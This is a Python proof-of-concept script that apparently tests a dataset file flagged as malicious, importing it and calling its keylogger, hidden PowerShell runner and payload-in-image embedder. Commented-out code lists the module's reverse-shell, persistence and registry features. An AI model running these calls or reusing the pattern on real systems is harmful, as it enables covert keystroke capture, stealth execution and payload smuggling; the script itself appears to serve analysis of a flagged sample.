# # PoC — loads the actual flagged full_MFE.py from the dataset.
# # Needs: pip install pycryptodome pynput. The platform tesing on should be supported to load the keyboad layout
# # PersistenceManager.add_registry() is real too -- a plain
# import sys
# import tempfile
# import time
# from pathlib import Path
# import os
# import sys

# dir = Path("/home/anonymous/repos/datasets/samples/ysn-rfd-text-dataset-tiny-code-script-py-format/malicious_file_embedding")
# sys.path.insert(0, str(dir))
# import full_MFE as mod  

# try:
#     mod.AESCipher(b"0" * 32).encrypt(b"hi")
# except NameError as e:
#     print("AESCipher.encrypt is broken as shipped:", e)

# run_py main 



#   if args.command == "embed":
#         if args.password:
#             key = AESCipher.derive_key(args.password)
#             cipher = AESCipher(key)
#         elif args.key:
#             cipher = AESCipher.load_key(args.key)
#         else:
#             cipher = AESCipher(get_random_bytes(32))
#             cipher.save_key("default.key")
#             logging.warning("[!] No key provided. Generated default.key")
#         embedder = PayloadEmbedder(cipher)
#         embedder.embed(args.host, args.payload, args.output)

#     elif args.command == "extract":
#         cipher = AESCipher.load_key(args.key, password=args.password)
#         embedder = PayloadEmbedder(cipher)
#         embedder.extract(args.stego, args.output)

#     elif args.command == "shell":
#         cipher = AESCipher.load_key(args.key, password=args.password)
#         start_reverse_shell_thread(args.ip, args.port, cipher)

#     elif args.command == "keylog":
#         start_keylogger(args.output, args.password)

#     elif args.command == "powershell":
#         run_powershell_script(args.script)

#     elif args.command == "persistence":
        

# # run_powershell_script() -- real, and works: hidden, silent exec.
# # marker = Path(tempfile.gettempdir()) / "poc_ps_proof.txt"
# # marker.unlink(missing_ok=True)
# # mod.run_powershell_script(f"Set-Content -Path '{marker}' -Value 'poc-powershell-executed'")  # <- the trigger
# # time.sleep(1)
# # print(marker.read_text() if marker.exists() else "not created (race condition in the file itself, see README)")



# PoC — direct function calls
import sys
import tempfile
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

import os
from pathlib import Path

dir = Path(os.path.expanduser("~/repos/datasets/samples/ysn-rfd-text-dataset-tiny-code-script-py-format/malicious_file_embedding"))

# Add the directory containing full_MFE.py
# flagged_dir = Path("/home/anonymous/repos/datasets/samples/ysn-rfd-text-dataset-tiny-code-script-py-format/malicious_file_embedding")
sys.path.insert(0, str(dir))
# Now import
import full_MFE as mod

# Mock winreg for Linux
try:
    # import winreg
    print()
except ImportError:
    import types
    winreg = types.ModuleType('winreg')
    for attr in ['HKEY_CURRENT_USER', 'HKEY_LOCAL_MACHINE', 'KEY_READ', 'KEY_WRITE', 
                 'REG_SZ', 'REG_DWORD', 'OpenKey', 'QueryValueEx', 'SetValueEx', 
                 'CloseKey', 'CreateKey', 'DeleteKey', 'EnumKey', 'EnumValue']:
        setattr(winreg, attr, lambda *args, **kwargs: None if not args else 0)
    sys.modules['winreg'] = winreg


def test_powershell():
    """Test PowerShell execution"""
    print("[*] Testing PowerShell command...")
    mod.run_powershell_script("Write-Host 'Hello from PowerShell'")

def test_keylogger():
    """Test keylogger"""
    print("[*] Testing keylogger...")
    # Note: This will start a keylogger - be careful!
    mod.start_keylogger("test_keylog.enc", "testpass")

def test_cipher():
    """Test AES encryption"""
    print("[*] Testing AES cipher...")
    key = get_random_bytes(32)
    cipher = mod.AESCipher(key)
    encrypted = cipher.encrypt(b"Hello World")
    decrypted = cipher.decrypt(encrypted)
    print(f"[+] Encrypted: {encrypted}")
    print(f"[+] Decrypted: {decrypted}")

def test_embed():
    """Test embedding payload"""
    print("[*] Testing embed functionality...")
    # Example files - adjust paths as needed
    host_file = "host.jpg"
    payload_file = "payload.exe"
    output_file = "output.stego"
    
    # Check if files exist
    if Path(host_file).exists() and Path(payload_file).exists():
        key = get_random_bytes(32)
        cipher = mod.AESCipher(key)
        embedder = mod.PayloadEmbedder(cipher)
        embedder.embed(host_file, payload_file, output_file)
        print(f"[+] Created {output_file}")
    else:
        print("[!] Host or payload file not found. Skipping embed test.")

if __name__ == "__main__":
    print("=== Testing full_MFE functionality ===\n")
    
    # Test basic functions (uncomment as needed)
    # test_cipher()
    test_powershell()
    test_embed()
    test_keylogger()
    
    print("\n=== Test complete ===")